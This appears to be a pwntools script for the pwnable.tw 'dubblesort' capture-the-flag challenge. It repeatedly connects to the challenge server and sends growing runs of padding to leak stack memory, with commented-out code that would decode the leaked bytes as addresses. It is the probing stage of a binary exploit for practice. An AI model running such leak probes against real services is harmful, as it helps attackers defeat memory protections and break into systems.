from pwn import * 
import warnings
import time
warnings.filterwarnings("ignore")
count = 1
for i in range(64):
    p = remote("chall.pwnable.tw",10101)
    # p = process("./dubblesorte")
    # context.terminal = ["foot"]
    # if count==15:
    #     gdb.attach(p)
    p.sendafter(":",b"a"*(count),timeout=0.5)
    p.recvuntil(b"a"*(count))
    buffer = p.recvuntil(",",drop=True)
    print(f"{count}->recstring: {buffer}")
    time.sleep(0.5)
    # chunk_size = 4
    # chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
    # lists = []
    # for i in range(len(chunks)):
    #     lists.append(u32(chunks[i].ljust(4, b"\x00")))
    # for i in range(len(lists)):
    #     log.info(f"{count}->recstring: {hex(lists[i])}")
    count+=1
    # p.close()
